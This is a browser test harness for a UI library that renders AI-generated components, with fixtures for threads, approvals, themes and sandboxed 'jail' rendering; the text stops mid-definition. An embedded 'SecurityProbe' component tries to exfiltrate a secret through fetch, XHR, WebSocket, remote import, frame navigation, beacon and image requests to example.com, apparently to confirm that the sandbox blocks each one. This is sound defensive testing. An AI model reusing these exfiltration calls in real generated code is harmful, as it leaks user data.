import type {
  ApprovalDecision,
  ApprovalRequest,
  Json,
  ToolOutcome,
  Tree,
  UIPayload,
  VendoTheme,
} from "@vendoai/core";
import {
  VendoProvider,
  createVendoClient,
  themeCssVariables,
  useVendoTheme,
  type OpenSurface,
  type Thread,
  type ToolMetaMap,
  type VendoClient,
} from "../../src/index.js";
import {
  ActivityPanel,
  ApprovalCard,
  AutomationsPanel,
  NoPolicyNotice,
  VendoOverlay,
  VendoPage,
  VendoPalette,
  VendoSlot,
  VendoStage,
  VendoThread,
  type VendoCommand,
} from "../../src/chrome/index.js";
import { AppFrame, PayloadView, TreeView, registerTreeRenderer, type PayloadRendererProps } from "../../src/tree/index.js";
import { browserTreeFixture } from "../fixtures/tree.js";
import {
  realtimeVoiceDriver,
  type VoiceDriver,
  type VoiceDriverEvent,
  type VoiceDriverHandlers,
  type VoiceSessionHandle,
} from "../../src/voice/index.js";
import {
  useEffect,
  useMemo,
  useState,
  type ComponentType,
  type CSSProperties,
  type ReactNode,
} from "react";
import { createRoot } from "react-dom/client";
import "./styles.css";

const NOW = "2026-07-11T12:00:00.000Z";
const ok = async (): Promise<ToolOutcome> => ({ status: "ok", output: { accepted: true } });

const destructiveApproval: ApprovalRequest = {
  id: "apr_destructive",
  call: {
    id: "call_destructive",
    tool: "host_delete_invoice",
    args: { invoiceId: "inv_42", permanent: true },
  },
  descriptor: {
    name: "host_delete_invoice",
    description: "Permanently delete an invoice",
    inputSchema: { type: "object" },
    risk: "destructive",
    critical: true,
  },
  inputPreview: "invoiceId=inv_42\npermanent=true",
  ctx: {
    principal: { kind: "user", subject: "browser-user", display: "Browser User" },
    venue: "app",
    presence: "present",
    appId: "app_1",
  },
  createdAt: NOW,
};

const darkTheme: Partial<VendoTheme> = {
  colors: {
    background: "#111827",
    surface: "#1f2937",
    text: "#f9fafb",
    muted: "#d1d5db",
    accent: "#38bdf8",
    accentText: "#082f49",
    danger: "#fda4af",
    border: "#64748b",
  },
  typography: { fontFamily: "Inter, ui-sans-serif, system-ui, sans-serif", baseSize: "16px" },
  radius: { small: "4px", medium: "12px", large: "24px" },
  density: "comfortable",
  motion: "reduced",
};

const loudTheme: Partial<VendoTheme> = {
  colors: {
    background: "#fff7ed",
    surface: "#ffedd5",
    text: "#3b0764",
    muted: "#6b21a8",
    accent: "#7e22ce",
    accentText: "#ffffff",
    danger: "#b91c1c",
    border: "#f97316",
  },
  typography: {
    fontFamily: "Georgia, 'Times New Roman', serif",
    headingFamily: "Impact, Haettenschweiler, sans-serif",
    baseSize: "18px",
  },
  radius: { small: "2px", medium: "20px", large: "34px" },
  density: "comfortable",
  motion: "reduced",
};

const pendingThread: Thread = {
  id: "thr_1",
  subject: "browser-user",
  createdAt: NOW,
  updatedAt: NOW,
  messages: [{
    id: "msg_pending",
    role: "assistant",
    parts: [
      { type: "text", text: "I prepared the email and need your approval before sending." },
      {
        type: "dynamic-tool",
        toolName: "host_email_send",
        toolCallId: "call_pending",
        state: "approval-requested",
        input: { to: "finance@example.com", subject: "Invoice ready" },
        approval: { id: "apr_pending" },
      },
      {
        type: "data-vendo-approval",
        data: { toolCallId: "call_pending", risk: "write", approvalId: "apr_pending" },
      },
    ],
  }],
};

/** ENG-212: a long conversation that overflows any bounded pane, ending in a
 *  pending approval — the exact "chat bricks under real content" shape measured
 *  live on Cadence /assistant. Reuses thr_1 so the wire list() adopts it. */
const boundedThread: Thread = {
  id: "thr_1",
  subject: "browser-user",
  createdAt: NOW,
  updatedAt: NOW,
  messages: [
    ...Array.from({ length: 10 }, (_, index) => [
      {
        id: `msg_long_u${index}`,
        role: "user" as const,
        parts: [{ type: "text" as const, text: `Question ${index + 1}: what happened to my money this month?` }],
      },
      {
        id: `msg_long_a${index}`,
        role: "assistant" as const,
        parts: [{
          type: "text" as const,
          text: `Answer ${index + 1}: Looking at your transactions, the largest categories were groceries, `
            + "subscriptions and late-night delivery. The recurring charges add up to a meaningful share of the "
            + "month, and there are a few one-off purchases worth reviewing together before we set up any rules.",
        }],
      },
    ]).flat(),
    {
      id: "msg_long_pending",
      role: "assistant",
      parts: [
        { type: "text", text: "I prepared the email and need your approval before sending." },
        {
          type: "dynamic-tool",
          toolName: "host_email_send",
          toolCallId: "call_pending",
          state: "approval-requested",
          input: { to: "finance@example.com", subject: "Invoice ready" },
          approval: { id: "apr_pending" },
        },
        {
          type: "data-vendo-approval",
          data: { toolCallId: "call_pending", risk: "write", approvalId: "apr_pending" },
        },
      ],
    },
  ],
};

/** ENG-216 — host-supplied friendly tool metadata: labels, descriptions and a
 *  custom arg summarizer. Chips and the approval card read this over the raw
 *  slug / lifecycle string / raw JSON. */
const humanizedTools: ToolMetaMap = {
  host_send_email: { label: "Send email", description: "Send an email on the customer's behalf" },
  host_list_client_documents: { label: "Look up client documents" },
  host_transfer_funds: {
    label: "Transfer funds",
    description: "Move money between the customer's accounts",
    summarize: args => {
      const record = (args ?? {}) as { amount?: unknown; to?: unknown };
      return typeof record.amount === "number" && typeof record.to === "string"
        ? `$${record.amount.toLocaleString()} → ${record.to}`
        : undefined;
    },
  },
};

/** ENG-216 — a turn that exercises every humanization behavior at once: a chip
 *  with a host label + arg summary, a run of eight identical read chips that
 *  collapse into one ×8 entry, and a pending destructive approval whose card
 *  shows a friendly title/description and readable inputs (no fabricated ctx). */
const humanizedThread: Thread = {
  id: "thr_humanized",
  subject: "browser-user",
  createdAt: NOW,
  updatedAt: NOW,
  messages: [{
    id: "msg_humanized",
    role: "assistant",
    parts: [
      { type: "text", text: "I reviewed the client's documents and drafted the transfer for your approval." },
      {
        type: "dynamic-tool",
        toolName: "host_send_email",
        toolCallId: "call_email",
        state: "output-available",
        input: { to: "ada@maple.example", subject: "Your statement is ready" },
        output: { ok: true },
      },
      ...Array.from({ length: 8 }, (_, index) => ({
        type: "dynamic-tool" as const,
        toolName: "host_list_client_documents",
        toolCallId: `call_doc_${index}`,
        state: "output-available" as const,
        input: { scope: "all" },
        output: { ok: true },
      })),
      {
        type: "dynamic-tool",
        toolName: "host_transfer_funds",
        toolCallId: "call_transfer",
        state: "approval-requested",
        input: { amount: 4200, currency: "USD", to: "Savings ••1234" },
        approval: { id: "apr_transfer" },
      },
      {
        type: "data-vendo-approval",
        data: { toolCallId: "call_transfer", risk: "destructive", approvalId: "apr_transfer" },
      },
    ],
  }],
};

/** An in-thread app surface (VendoViewPart) whose payload carries a format no
 *  renderer is registered for — it must contain to a notice, never break the thread. */
const unknownViewThread: Thread = {
  id: "thr_unknown",
  subject: "browser-user",
  createdAt: NOW,
  updatedAt: NOW,
  messages: [{
    id: "msg_unknown_view",
    role: "assistant",
    parts: [
      { type: "text", text: "Here is the surface from a newer runtime." },
      {
        type: "data-vendo-view",
        data: {
          appId: "app_future",
          payload: { formatVersion: "vendo-genui/v999", root: "root", nodes: [] },
        },
      },
      { type: "text", text: "The conversation keeps going past the unknown surface." },
    ],
  }],
};

function threadClient(client: VendoClient, thread: Thread): VendoClient {
  // A thread that get() serves must also appear in list(): useVendoThread only
  // adopts a supplied threadId after confirming it exists in list() (the ENG-211
  // stale-id graceful degradation guard). Stubbing get() alone would degrade the
  // thread to the empty greeting state.
  return {
    ...client,
    threads: {
      ...client.threads,
      get: async id => id === thread.id ? thread : client.threads.get(id),
      list: async () => {
        const rest = (await client.threads.list()).filter(summary => summary.id !== thread.id);
        return [{ id: thread.id, title: thread.subject, updatedAt: thread.updatedAt }, ...rest];
      },
    },
  };
}

/** A client whose opened surface throws when the pin mount renders it — proves
 *  the VendoSlot pin boundary falls back to the original host component
 *  (06-apps §8; 08-ui §5). The throw must happen at RENDER time (the boundary
 *  only catches render errors), so the surface's `kind` getter explodes. */
function throwingOpenClient(client: VendoClient): VendoClient {
  const broken = {} as OpenSurface;
  Object.defineProperty(broken, "kind", {
    get() { throw new Error("pin mount exploded during render"); },
  });
  return {
    ...client,
    apps: { ...client.apps, open: async () => broken },
  };
}

function HostCard({ title, total, children }: { title?: string; total?: number; children?: ReactNode }) {
  return <article className="host-card"><strong>{title}</strong><div>Bound total: {total}</div>{children}</article>;
}

function Boom(): ReactNode {
  throw new Error("host render exploded inside its node boundary");
}

const components: Record<string, ComponentType> = {
  HostCard: HostCard as ComponentType,
  Boom,
};

const tree = browserTreeFixture;

const securitySource = String.raw`
import React, { useState } from "react";

export default function SecurityProbe({ label, onRun }) {
  const [fetchStatus, setFetchStatus] = useState("not run");
  const [xhrStatus, setXhrStatus] = useState("not run");
  const [socketStatus, setSocketStatus] = useState("not run");
  const [importStatus, setImportStatus] = useState("not run");
  const [parentStatus, setParentStatus] = useState("not run");
  const [actionStatus, setActionStatus] = useState("not run");
  const [navigateStatus, setNavigateStatus] = useState("not run");
  const [beaconStatus, setBeaconStatus] = useState("not run");
  const [imageStatus, setImageStatus] = useState("not run");
  const [expanded, setExpanded] = useState(false);

  async function probeFetch() {
    try {
      await fetch("https://example.com/probe");
      setFetchStatus("UNEXPECTED SUCCESS");
    } catch {
      setFetchStatus("FAILURE (CSP)");
    }
  }

  // XHR is a distinct API from fetch but the same connect-src directive governs it.
  function probeXhr() {
    try {
      const xhr = new XMLHttpRequest();
      xhr.open("GET", "https://example.com/xhr-exfil?secret=" + encodeURIComponent(label));
      xhr.onload = () => setXhrStatus("UNEXPECTED SUCCESS");
      xhr.onerror = () => setXhrStatus("FAILURE (CSP)");
      xhr.send();
    } catch {
      setXhrStatus("FAILURE (CSP)");
    }
  }

  // WebSocket construction is blocked outright by connect-src 'none' (throws).
  function probeSocket() {
    try {
      const socket = new WebSocket("wss://example.com/socket-exfil");
      socket.onopen = () => setSocketStatus("UNEXPECTED SUCCESS");
      socket.onerror = () => setSocketStatus("FAILURE (CSP)");
    } catch {
      setSocketStatus("FAILURE (CSP)");
    }
  }

  async function probeImport() {
    try {
      await import("https://example.com/mod.js");
      setImportStatus("UNEXPECTED SUCCESS");
    } catch {
      setImportStatus("FAILURE (CSP)");
    }
  }

  function probeParent() {
    try {
      void parent.document.body;
      setParentStatus("UNEXPECTED SUCCESS");
    } catch {
      setParentStatus("FAILURE (opaque origin)");
    }
  }

  // Exfiltration by navigating the jail frame itself: governed by neither
  // connect-src nor img-src nor the sandbox's form/popup flags.
  function probeNavigate() {
    try {
      location.href = "https://example.com/nav-exfil?secret=" + encodeURIComponent(label);
      setNavigateStatus("navigation attempted");
    } catch {
      setNavigateStatus("FAILURE (blocked)");
    }
  }

  function probeBeacon() {
    try {
      const ok = navigator.sendBeacon("https://example.com/beacon", "secret");
      setBeaconStatus(ok ? "UNEXPECTED SUCCESS" : "FAILURE (CSP)");
    } catch {
      setBeaconStatus("FAILURE (CSP)");
    }
  }

  function probeImage() {
    const img = new Image();
    img.onload = () => setImageStatus("UNEXPECTED SUCCESS");
    img.onerror = () => setImageStatus("FAILURE (CSP)");
    img.src = "https://example.com/pixel.png?secret=1";
  }

  async function dispatch() {
    await onRun();
    setActionStatus("delivered");
  }

  return <section
    aria-label="Generated security probe"
    style={{ minHeight: "100vh", paddingBottom: 40 }}
  >
    <h2>{label}</h2>
    <button type="button" onClick={() => setExpanded(value => !value)}>
      {expanded ? "Collapse content" : "Expand content"}
    </button>
    <div
      aria-label="Resizable generated content"
      style={{ height: expanded ? 520 : 80, background: "linear-gradient(#dbeafe, #eff6ff)" }}
    />
    <button type="button" onClick={probeFetch}>Probe fetch</button>
    <output id="fetch-status">fetch: {fetchStatus}</output>
    <button type="button" onClick={probeXhr}>Probe xhr</button>
    <output id="xhr-status">xhr: {xhrStatus}</output>
    <button type="button" onClick={probeSocket}>Probe socket</button>
    <output id="socket-status">socket: {socketStatus}</output>
    <button type="button" onClick={probeImport}>Probe import</button>
    <output id="import-status">import: {importStatus}</output>
    <button type="button" onClick={probeParent}>Probe parent DOM</button>
    <output id="parent-status">parent: {parentStatus}</output>
    <button type="button" onClick={dispatch}>Dispatch action</button>
    <output id="action-status">action: {actionStatus}</output>
    <button type="button" onClick={probeNavigate}>Probe navigate</button>
    <output id="navigate-status">navigate: {navigateStatus}</output>
    <button type="button" onClick={probeBeacon}>Probe beacon</button>
    <output id="beacon-status">beacon: {beaconStatus}</output>
    <button type="button" onClick={probeImage}>Probe image</button>
    <output id="image-status">image: {imageStatus}</output>
  </section>;
}
`;

const throwingSource = String.raw`
export default function ThrowingGeneratedComponent() {
  throw new Error("generated render exploded inside its jail");
}
`;

const emptySource = String.raw`
export default function EmptyGeneratedComponent() {
  return null;
}
`;

const furnishedPinSource = String.raw`
import { FurnishedCardBody } from "./FurnishedCardBody";

export default function FurnishedPin(props) {
  return <FurnishedCardBody {...props} />;
}
`;

const furnishedCardBodySource = String.raw`
import { FurnishedBadge } from "./FurnishedBadge";

export function FurnishedCardBody({ customer, total }) {
  return <article className="furnished-pin-card">
    <FurnishedBadge />
    <h2>Furnished fork for {customer}</h2>
    <p>Stubbed invoice total: {total}</p>
  </article>;
}
`;

const furnishedBadgeSource = String.raw`
export function FurnishedBadge() {
  return <span className="furnished-pin-badge">captured styles</span>;
}
`;

const jailTree: Tree & { furnishings: Record<string, unknown> } = {
  formatVersion: "vendo-genui/v1",
  root: "root",
  nodes: [
    { id: "root", component: "Stack", children: ["before", "furnished", "probe", "thrower", "empty", "after"] },
    { id: "before", component: "Text", props: { text: "Jail siblings before" } },
    { id: "furnished", component: "FurnishedPin", source: "generated" },
    {
      id: "probe",
      component: "SecurityProbe",
      source: "generated",
      props: {
        label: "Rendered generated props",
        onRun: { $action: "fn:secure-submit", payload: { invoiceId: "inv_42" } },
      },
    },
    { id: "thrower", component: "ThrowingGeneratedComponent", source: "generated" },
    { id: "empty", component: "EmptyGeneratedComponent", source: "generated" },
    { id: "after", component: "Text", props: { text: "Jail sibling survived" } },
  ],
  components: {
    FurnishedPin: furnishedPinSource,
    SecurityProbe: securitySource,
    ThrowingGeneratedComponent: throwingSource,
    EmptyGeneratedComponent: emptySource,
  },
  furnishings: {
    FurnishedPin: {
      sourceImports: { "./FurnishedCardBody": "src/components/FurnishedCardBody.tsx" },
      subSources: {
        "src/components/FurnishedCardBody.tsx": {
          source: furnishedCardBodySource,
          imports: { "./FurnishedBadge": "src/components/FurnishedBadge.tsx" },
        },
        "src/components/FurnishedBadge.tsx": {
          source: furnishedBadgeSource,
          imports: {},
        },
      },
      sampleProps: { customer: "Ada", total: "$4,200" },
      styles: [{
        path: "src/app/globals.css",
        css: String.raw`
          .furnished-pin-card {
            background: rgb(239, 246, 255);
            border: 2px solid rgb(37, 99, 235);
            border-radius: 14px;
            padding: 16px;
          }
          .furnished-pin-badge {
            background: rgb(30, 64, 175);
            border-radius: 999px;
            color: white;
            display: inline-block;
            font-weight: 700;
            padding: 4px 10px;
          }
        `,
      }],
    },
  },
};

/** 06-apps §9 — the in-client venue scenario: the SAME generated source, once
 *  with a server-granted hash-pinned approval (host-page mount, host-page
 *  authority) and once with a stale approval (loud drop-back to the jail). */
const inClientSource = String.raw`
import React, { useState } from "react";

export default function PromotedCard({ customer, onRun }) {
  const [fetchStatus, setFetchStatus] = useState("not run");
  const [actionStatus, setActionStatus] = useState("not run");

  // In the host page this SUCCEEDS (host authority); the jail's CSP forbids it.
  async function probeFetch() {
    try {
      const response = await fetch("/frame-target.html");
      setFetchStatus(response.ok ? "SUCCESS (host authority)" : "HTTP " + response.status);
    } catch {
      setFetchStatus("FAILURE (CSP)");
    }
  }

  async function dispatch() {
    await onRun();
    setActionStatus("delivered");
  }

  return <section aria-label="Promoted in-client card" className="promoted-card">
    <h2>Promoted card for {customer}</h2>
    <button type="button" onClick={probeFetch}>Probe host fetch</button>
    <output id="inclient-fetch-status">fetch: {fetchStatus}</output>
    <button type="button" onClick={dispatch}>Dispatch promoted action</button>
    <output id="inclient-action-status">action: {actionStatus}</output>
  </section>;
}
`;

function inClientTree(inClient: Record<string, unknown>): Tree {
  return {
    formatVersion: "vendo-genui/v1",
    root: "root",
    nodes: [
      { id: "root", component: "Stack", children: ["promoted", "sibling"] },
      {
        id: "promoted",
        component: "PromotedCard",
        source: "generated",
        props: {
          customer: "Ada",
          onRun: { $action: "fn:promoted-submit", payload: { invoiceId: "inv_42" } },
        },
      },
      { id: "sibling", component: "Text", props: { text: "Host sibling survived" } },
    ],
    components: { PromotedCard: inClientSource },
    ...( { inClient } as object),
  } as Tree;
}

function InClientScenario() {
  const [action, setAction] = useState<{ nodeId: string; action: string; payload?: Json }>();
  const onAction = async (request: { nodeId: string; action: string; payload?: Json }): Promise<ToolOutcome> => {
    setAction(request);
    return { status: "ok", output: { recorded: true } };
  };
  return (
    <TreeThemeBoundary>
      <div className="inclient-grid">
        <section aria-label="Approved in-client venue">
          <h2>Approved — host-page mount</h2>
          <TreeView
            tree={inClientTree({
              granted: true,
              versionHash: "sha256:approved",
              approvedBy: "host-console",
              at: NOW,
            })}
            components={components}
            onAction={onAction}
          />
        </section>
        <section aria-label="Stale in-client approval">
          <h2>Version changed — dropped back to the sandbox</h2>
          <TreeView
            tree={inClientTree({
              granted: false,
              versionHash: "sha256:new-version",
              reason: "version-changed",
            })}
            components={components}
            onAction={onAction}
          />
        </section>
      </div>
      <output className="recorder" data-testid="inclient-action-recorder">{action ? JSON.stringify(action) : "No action recorded"}</output>
    </TreeThemeBoundary>
  );
}

/** 06-apps §8 — the drift notice scenario: the host updated the component a
 *  pin was remixed from, so the payload carries a server-written `pinDrift`
 *  report. The surface says so loudly ABOVE the tree while the remixed fork
 *  keeps rendering in its jail — nothing changes without the user. */
const driftedPinSource = String.raw`
import React from "react";

export default function RemixedNetWorthCard() {
  return <section aria-label="Remixed net worth card" className="promoted-card">
    <h2>Net worth — remixed</h2>
    <strong>$1.2M in green</strong>
  </section>;
}
`;

function PinDriftScenario() {
  const tree: Tree = {
    formatVersion: "vendo-genui/v1",
    root: "root",
    nodes: [
      { id: "root", component: "Stack", children: ["worth", "sibling"] },
      { id: "worth", component: "RemixedNetWorthCard", source: "generated" },
      { id: "sibling", component: "Text", props: { text: "Host sibling survived" } },
    ],
    components: { RemixedNetWorthCard: driftedPinSource },
    ...({
      pinDrift: [{
        slot: "net-worth-card",
        component: "RemixedNetWorthCard",
        baseHash: "sha256:maple-old",
        baselineHash: "sha256:maple-new",
        reason: "baseline-changed",
      }],
    } as object),
  } as Tree;
  return (
    <TreeThemeBoundary>
      <section aria-label="Drifted remixed pin">
        <h2>Host component updated under the remix</h2>
        <TreeView
          tree={tree}
          components={components}
          onAction={async () => ({ status: "ok", output: null })}
        />
      </section>
    </TreeThemeBoundary>
  );
}

class ScriptedBrowserVoiceDriver implements VoiceDriver {
  start(handlers: VoiceDriverHandlers): VoiceSessionHandle {
    let active = true;
    const emit = (event: VoiceDriverEvent) => { if (active) handlers.onEvent(event); };
    queueMicrotask(() => {
      emit({ type: "state", state: "listening" });
      emit({ type: "transcript", entry: { id: "voice-user", role: "user", text: "Show revenue", final: true } });
      emit({ type: "transcript", entry: { id: "voice-assistant", role: "assistant", text: "Revenue is ready", final: true } });
    });
    return { stop: () => { active = false; } };
  }
}

function AutoOpen({ selector, children }: { selector: string; children: ReactNode }) {
  useEffect(() => {
    queueMicrotask(() => document.querySelector<HTMLElement>(selector)?.click());
  }, [selector]);
  return children;
}

function OpenPalette() {
  const [command, setCommand] = useState<VendoCommand>();
  const open = () => globalThis.dispatchEvent(new KeyboardEvent("keydown", { key: "k", ctrlKey: true, bubbles: true }));
  useEffect(() => {
    queueMicrotask(() => {
      document.querySelector<HTMLElement>("[data-testid=palette-opener]")?.focus();
      open();
    });
  }, []);
  return <><button type="button" data-testid="palette-opener" onClick={open}>Open command palette</button><VendoPalette onCommand={setCommand} /><output className="recorder" data-testid="command-recorder">{command ? JSON.stringify(command) : "No command selected"}</output></>;
}

function ApprovalScenario() {
  const [decision, setDecision] = useState<ApprovalDecision>();
  const decide = async (next: ApprovalDecision) => setDecision(next);
  return decision
    ? <output className="recorder" data-testid="approval-recorder">resolved: {JSON.stringify(decision)}</output>
    : <ApprovalCard approval={destructiveApproval} onDecide={decide} />;
}

function TreeThemeBoundary({ children }: { children: ReactNode }) {
  const theme = useVendoTheme();
  return <div className="tree-theme-boundary" style={themeCssVariables(theme) as CSSProperties}>{children}</div>;
}

function TreeScenario({ jail = false }: { jail?: boolean }) {
  const [action, setAction] = useState<{ nodeId: string; action: string; payload?: Json }>();
  const onAction = async (request: { nodeId: string; action: string; payload?: Json }): Promise<ToolOutcome> => {
    setAction(request);
    return { status: "ok", output: { recorded: true } };
  };
  return (
    <TreeThemeBoundary>
      <TreeView tree={jail ? jailTree : tree} components={components} onAction={onAction} />
      {jail ? <output className="recorder" data-testid="action-recorder">{action ? JSON.stringify(action) : "No action recorded"}</output> : null}
    </TreeThemeBoundary>
  );
}

function StageScenario() {
  const driver = useMemo(() => new ScriptedBrowserVoiceDriver(), []);
  return (
    <VendoProvider client={baseClient} voice={{ driver }}>
      <AutoOpen selector='button[aria-label="Start voice"], button'>
        <VendoStage />
      </AutoOpen>
    </VendoProvider>
  );
}

/** LIVE scenario (OPENAI_API_KEY-gated spec): the REAL realtime WebRTC driver.
 *  The ephemeral client secret arrives in the URL hash — the standing API key
 *  never reaches the browser, exactly as the driver's getSession() seam intends. */
function LiveStageScenario() {
  const driver = useMemo(() => {
    const clientSecret = decodeURIComponent(globalThis.location.hash.slice(1));
    return realtimeVoiceDriver({
      getSession: async () => ({ clientSecret }),
      instructions: "You are a terse test agent. Say 'ready' and wait.",
    });
  }, []);
  return (
    <VendoProvider client={baseClient} voice={{ driver }}>
      <VendoStage />
    </VendoProvider>
  );
}

function AppFrameScenario() {
  const cover = "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='640' height='320'%3E%3Crect width='640' height='320' fill='%23ede9fe'/%3E%3Crect x='36' y='48' width='380' height='30' rx='8' fill='%238b5cf6'/%3E%3Crect x='36' y='106' width='550' height='18' rx='6' fill='%23c4b5fd'/%3E%3Crect x='36' y='145' width='490' height='18' rx='6' fill='%23ddd6fe'/%3E%3C/svg%3E";
  return (
    <div className="appframe-grid">
      <section aria-label="HTTP app frame same-origin"><h2>HTTP same-origin</h2><AppFrame surface={{ kind: "http", url: "/frame-target.html" }} /></section>
      <section aria-label="HTTP app frame cross-origin"><h2>HTTP cross-origin</h2><AppFrame surface={{ kind: "http", url: "https://app.example.com/machine" }} /></section>
      <section aria-label="Resuming app frame"><h2>Resuming</h2><AppFrame surface={{ kind: "resuming", cover }} /></section>
    </div>
  );
}

const baseClient = createVendoClient({ baseUrl: "/api/vendo" });
const unconfiguredClient = createVendoClient({ baseUrl: "/api/vendo", headers: { "x-vendo-force-posture": "unconfigured" } });

// A Maple-brand host theme (graphite accent, warm cream canvas) — the same
// brand the old shell adopted, so the landing reads like the real product.
const mapleTheme: Partial<VendoTheme> = {
  colors: {
    background: "#f3ede2", surface: "#fffdf9", text: "#14151a", muted: "#8a8b92",
    accent: "#1b1c22", accentText: "#ffffff", danger: "#b0392b", border: "rgba(20,21,26,.10)",
  },
  typography: { fontFamily: "Inter, ui-sans-serif, system-ui, sans-serif", baseSize: "15px" },
  radius: { small: "8px", medium: "12px", large: "20px" }, density: "comfortable", motion: "full",
};

/** A minimal Maple host shell (sidebar + top bar + Chat tab) so a Vendo surface
 *  renders in a realistic host context, matching the wave-2 shell's demos. */
function MapleFrame({ children }: { children: ReactNode }) {
  const navItem = (label: string, active = false) => (
    <div style={{ display: "flex", alignItems: "center", gap: 10, padding: "8px 10px", borderRadius: 8, fontSize: 14,
      color: active ? "#14151a" : "#5b5c63", background: active ? "rgba(20,21,26,.05)" : "transparent", fontWeight: active ? 600 : 500 }}>
      <span style={{ width: 16, height: 16, borderRadius: 4, background: "currentColor", opacity: .55 }} />{label}
    </div>
  );
  const topBtn = (label: string, dark = false) => (
    <button style={{ padding: "8px 14px", borderRadius: 10, fontSize: 13.5, fontWeight: 600, cursor: "pointer",
      border: dark ? "0" : "1px solid rgba(20,21,26,.12)", background: dark ? "#14151a" : "#fff", color: dark ? "#fff" : "#14151a" }}>{label}</button>
  );
  return (
    <div style={{ display: "grid", gridTemplateColumns: "216px 1fr", height: "100%", background: "#fff", color: "#14151a",
      fontFamily: "Inter, ui-sans-serif, system-ui, sans-serif" }}>
      <aside style={{ borderRight: "1px solid rgba(20,21,26,.08)", padding: "16px 14px", display: "flex", flexDirection: "column", gap: 4 }}>
        <div style={{ display: "flex", alignItems: "center", gap: 9, padding: "4px 8px 16px", fontWeight: 700, fontSize: 18 }}>
          <span style={{ width: 26, height: 26, borderRadius: 8, background: "#14151a", color: "#fff", display: "grid", placeItems: "center", fontSize: 13 }}>◈</span>Maple
        </div>
        {navItem("Home")}{navItem("Accounts")}{navItem("Transactions")}{navItem("Cards")}{navItem("Payments")}{navItem("Insights")}{navItem("Ask Maple", true)}
        <div style={{ marginTop: "auto", display: "flex", flexDirection: "column", gap: 4 }}>{navItem("Activity")}{navItem("Settings")}</div>
      </aside>
      <div style={{ display: "flex", flexDirection: "column", minWidth: 0 }}>
        <header style={{ display: "flex", alignItems: "center", gap: 14, padding: "12px 22px", borderBottom: "1px solid rgba(20,21,26,.08)" }}>
          <strong style={{ fontSize: 16 }}>Ask Maple</strong>
          <div style={{ flex: 1, maxWidth: 320, display: "flex", alignItems: "center", gap: 8, padding: "7px 12px", borderRadius: 10, border: "1px solid rgba(20,21,26,.12)", color: "#8a8b92", fontSize: 13 }}>Search…<span style={{ marginLeft: "auto", fontSize: 11, border: "1px solid rgba(20,21,26,.12)", borderRadius: 5, padding: "1px 5px" }}>⌘K</span></div>
          <div style={{ marginLeft: "auto", display: "flex", gap: 8 }}>{topBtn("Send", true)}{topBtn("Request")}{topBtn("Move money")}</div>
        </header>
        <div style={{ padding: "0 22px", borderBottom: "1px solid rgba(20,21,26,.08)", display: "flex", gap: 16, fontSize: 13.5 }}>
          <span style={{ padding: "12px 2px", borderBottom: "2px solid #14151a", fontWeight: 600 }}>Chat</span>
          <span style={{ padding: "12px 2px", color: "#8a8b92" }}>+</span>
        </div>
        <div style={{ flex: 1, minHeight: 0 }}>{children}</div>
      </div>
    </div>
  );
}

const MAPLE_SUGGESTIONS = [
  "What did I spend money on when I should've been asleep?",
  "What was that $87 DoorDash charge?",
  "Put me on blast in Slack when I order late-night delivery",
];

function LandingScenario() {
  return (
    <VendoProvider client={baseClient} components={components} theme={mapleTheme}>
      <MapleFrame>
        <VendoThread greeting="What do you want to build?" suggestions={MAPLE_SUGGESTIONS} onVoice={() => undefined} />
      </MapleFrame>
    </VendoProvider>
  );
}

/** Containment (c): an unregistered formatVersion must render a contained notice
 *  both when handed straight to the renderer AND when it arrives in a thread. */
function UnknownFormatScenario() {
  const noop = async (): Promise<ToolOutcome> => ({ status: "ok", output: null });
  return (
    <div className="unknown-format-grid">
      <section aria-label="Unknown format direct">
        <h2>Direct renderer</h2>
        <PayloadView
          payload={{ formatVersion: "vendo-genui/v999", root: "root", nodes: [] }}
          components={components}
          onAction={noop}
        />
        <p>Host content after the direct unknown surface survived.</p>
      </section>
      <section aria-label="Unknown format in thread">
        <h2>In a thread</h2>
        <VendoProvider client={threadClient(baseClient, unknownViewThread)} components={components}>
          <VendoThread threadId="thr_unknown" />
        </VendoProvider>
      </section>
    </div>
  );
}

/** Containment (b): a dangling child renders a skeleton; when the streamed node
 *  later arrives, the skeleton swaps in for the real content. */
function StreamCompletionScenario() {
  const [complete, setComplete] = useState(false);
  useEffect(() => {
    const timer = globalThis.setTimeout(() => setComplete(true), 250);
    return () => globalThis.clearTimeout(timer);
  }, []);
  const noop = async (): Promise<ToolOutcome> => ({ status: "ok", output: null });
  const streamingTree: Tree = {
    formatVersion: "vendo-genui/v1",
    root: "root",
    nodes: [
      { id: "root", component: "Stack", children: ["late"] },
      ...(complete ? [{ id: "late", component: "Text", props: { text: "Streamed node arrived" } }] : []),
    ],
  };
  return (
    <div data-stream-complete={complete}>
      <TreeView tree={streamingTree} components={components} onAction={noop} />
    </div>
  );
}

/** Containment (d): a pin/app that throws on mount → the VendoSlot error boundary
 *  falls back to the ORIGINAL host component (the children). */
function SlotFallbackScenario() {
  return (
    <VendoProvider client={throwingOpenClient(baseClient)} components={components}>
      <VendoSlot id="hero" appId="app_1">
        <section aria-label="Original host component"><h2>Original host hero</h2><p>Host fallback stayed on screen.</p></section>
      </VendoSlot>
    </VendoProvider>
  );
}

/**
 * FORMAT-EVOLUTION FIRE DRILL (08-ui §5; 01-core §8). A throwaway second UI
 * format, registered ONLY in this test harness — never in product source. It
 * proves the renderer registry's evolution seam opens in a real browser: a
 * registered drill renderer renders; an unregistered drill tag contains to a
 * notice while v1 trees on the same page keep rendering; and a stored v0 tree
 * renders identically whether or not the drill format is registered.
 */
const DRILL_FORMAT = "vendo/tree@2-drill";

interface DrillBlock { heading: string; body: string }

const drillPayload = {
  formatVersion: DRILL_FORMAT,
  // Deliberately non-tree-shaped (no root/nodes): a future format owns its body.
  blocks: [
    { heading: "Quarterly revenue", body: "$4,200 across 3 invoices" },
    { heading: "Next step", body: "Send the reminder" },
  ] satisfies DrillBlock[],
};

/** A throwaway renderer for the drill format's block-list shape. */
function DrillRenderer({ payload }: PayloadRendererProps) {
  const blocks = (payload as { blocks?: DrillBlock[] }).blocks ?? [];
  return (
    <section aria-label="Drill format surface">
      {blocks.map((block, index) => (
        <article key={index}><h3>{block.heading}</h3><p>{block.body}</p></article>
      ))}
    </section>
  );
}

/** A stable v0 tree used as the "stored old-format record" across both drill
 *  scenarios — its rendering must be byte-for-byte the same registered or not. */
const storedV1Tree: Tree = {
  formatVersion: "vendo-genui/v1",
  root: "root",
  data: { invoice: { total: 4200 } },
  nodes: [
    { id: "root", component: "Stack", props: { gap: 8 }, children: ["heading", "amount"] },
